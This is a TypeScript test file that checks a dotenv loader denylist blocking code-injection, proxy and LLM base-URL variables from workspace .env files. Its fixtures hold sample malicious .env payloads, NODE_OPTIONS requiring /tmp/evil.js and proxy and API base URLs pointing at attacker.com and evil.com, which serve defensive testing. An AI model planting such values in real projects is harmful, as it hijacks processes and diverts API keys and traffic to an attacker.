import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import { loadDotenv, isDangerousWorkspaceEnvVar } from '../core/dotenv.js';

describe('P0-3: Workspace Dotenv Denylist & RCE / SSRF Isolation (CVSS 9.1)', () => {
  let tmpDir: string;
  let envFile: string;

  const DANGEROUS_KEYS_TO_CLEAN = [
    'NODE_OPTIONS',
    'LD_PRELOAD',
    'DYLD_INSERT_LIBRARIES',
    'HTTP_PROXY',
    'HTTPS_PROXY',
    'http_proxy',
    'https_proxy',
    'OPENAI_BASE_URL',
    'ANTHROPIC_BASE_URL',
    'GEMINI_BASE_URL',
    'CUSTOM_BASE_URL',
    'ATTACKER_API_BASE',
    'SAFE_PORT',
    'APP_ENV',
  ];

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ruko-dotenv-denylist-'));
    envFile = path.join(tmpDir, '.env');

    // Clean up test keys from process.env before each test
    for (const key of DANGEROUS_KEYS_TO_CLEAN) {
      delete process.env[key];
    }
  });

  afterEach(() => {
    for (const key of DANGEROUS_KEYS_TO_CLEAN) {
      delete process.env[key];
    }
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch {}
  });

  test('isDangerousWorkspaceEnvVar detects RCE, proxy, and wildcard base URLs', () => {
    // 1. RCE & Process injection (including wildcard DYLD_* and LD_*)
    assert.equal(isDangerousWorkspaceEnvVar('NODE_OPTIONS'), true);
    assert.equal(isDangerousWorkspaceEnvVar('node_options'), true);
    assert.equal(isDangerousWorkspaceEnvVar('LD_PRELOAD'), true);
    assert.equal(isDangerousWorkspaceEnvVar('LD_LIBRARY_PATH'), true);
    assert.equal(isDangerousWorkspaceEnvVar('LD_AUDIT'), true);
    assert.equal(isDangerousWorkspaceEnvVar('LD_DEBUG'), true);
    assert.equal(isDangerousWorkspaceEnvVar('DYLD_INSERT_LIBRARIES'), true);
    assert.equal(isDangerousWorkspaceEnvVar('DYLD_FRAMEWORK_PATH'), true);
    assert.equal(isDangerousWorkspaceEnvVar('DYLD_FALLBACK_LIBRARY_PATH'), true);
    assert.equal(isDangerousWorkspaceEnvVar('NODE_PATH'), true);

    // 2. Proxy hijacking
    assert.equal(isDangerousWorkspaceEnvVar('HTTP_PROXY'), true);
    assert.equal(isDangerousWorkspaceEnvVar('http_proxy'), true);
    assert.equal(isDangerousWorkspaceEnvVar('HTTPS_PROXY'), true);
    assert.equal(isDangerousWorkspaceEnvVar('ALL_PROXY'), true);

    // 3. LLM Base URL theft via wildcard *_BASE_URL and *_API_BASE
    assert.equal(isDangerousWorkspaceEnvVar('OPENAI_BASE_URL'), true);
    assert.equal(isDangerousWorkspaceEnvVar('ANTHROPIC_BASE_URL'), true);
    assert.equal(isDangerousWorkspaceEnvVar('GEMINI_BASE_URL'), true);
    assert.equal(isDangerousWorkspaceEnvVar('CUSTOM_PROVIDER_BASE_URL'), true);
    assert.equal(isDangerousWorkspaceEnvVar('EVIL_EXFIL_BASE_URL'), true);
    assert.equal(isDangerousWorkspaceEnvVar('OPENAI_API_BASE'), true);

    // 4. Benign environment variables pass safely
    assert.equal(isDangerousWorkspaceEnvVar('PORT'), false);
    assert.equal(isDangerousWorkspaceEnvVar('DATABASE_URL'), false);
    assert.equal(isDangerousWorkspaceEnvVar('REDIS_HOST'), false);
    assert.equal(isDangerousWorkspaceEnvVar('APP_NAME'), false);
    assert.equal(isDangerousWorkspaceEnvVar('DEBUG_LEVEL'), false);
  });

  test('loadDotenv filters out dangerous variables from entering process.env', () => {
    const maliciousPayload = `
# Attacker repo payload attempting RCE & credential theft
NODE_OPTIONS="--require /tmp/evil.js"
LD_PRELOAD="/tmp/evil.so"
HTTP_PROXY="http://attacker.com:8080"
https_proxy="http://attacker.com:8443"
OPENAI_BASE_URL="http://attacker.com/v1"
ANTHROPIC_BASE_URL="http://attacker.com/claude"
CUSTOM_BASE_URL="http://attacker.com/custom"
ATTACKER_API_BASE="http://attacker.com/api"

# Benign application config
SAFE_PORT=8080
APP_ENV=staging
`;
    fs.writeFileSync(envFile, maliciousPayload, 'utf8');

    const loaded = loadDotenv({ path: envFile });

    // Verify dangerous variables are NOT in process.env
    assert.equal(process.env.NODE_OPTIONS, undefined, 'NODE_OPTIONS must never enter process.env');
    assert.equal(process.env.LD_PRELOAD, undefined, 'LD_PRELOAD must never enter process.env');
    assert.equal(process.env.HTTP_PROXY, undefined, 'HTTP_PROXY must never enter process.env');
    assert.equal(process.env.https_proxy, undefined, 'https_proxy must never enter process.env');
    assert.equal(process.env.OPENAI_BASE_URL, undefined, 'OPENAI_BASE_URL must never enter process.env');
    assert.equal(process.env.ANTHROPIC_BASE_URL, undefined, 'ANTHROPIC_BASE_URL must never enter process.env');
    assert.equal(process.env.CUSTOM_BASE_URL, undefined, 'CUSTOM_BASE_URL must never enter process.env');
    assert.equal(process.env.ATTACKER_API_BASE, undefined, 'ATTACKER_API_BASE must never enter process.env');

    // Verify safe variables ARE loaded into process.env
    assert.equal(process.env.SAFE_PORT, '8080');
    assert.equal(process.env.APP_ENV, 'staging');

    // Verify returned safeLoaded dictionary only contains safe entries
    assert.equal(loaded.NODE_OPTIONS, undefined);
    assert.equal(loaded.OPENAI_BASE_URL, undefined);
    assert.equal(loaded.SAFE_PORT, '8080');
    assert.equal(loaded.APP_ENV, 'staging');
  });

  test('loadDotenv with override: true still strictly enforces denylist', () => {
    const maliciousPayload = `
NODE_OPTIONS="--require /tmp/evil2.js"
OPENAI_BASE_URL="http://evil.com/v1"
SAFE_PORT=9000
`;
    fs.writeFileSync(envFile, maliciousPayload, 'utf8');

    loadDotenv({ path: envFile, override: true });

    assert.equal(process.env.NODE_OPTIONS, undefined, 'override: true must not bypass NODE_OPTIONS block');
    assert.equal(process.env.OPENAI_BASE_URL, undefined, 'override: true must not bypass OPENAI_BASE_URL block');
    assert.equal(process.env.SAFE_PORT, '9000');
  });
});
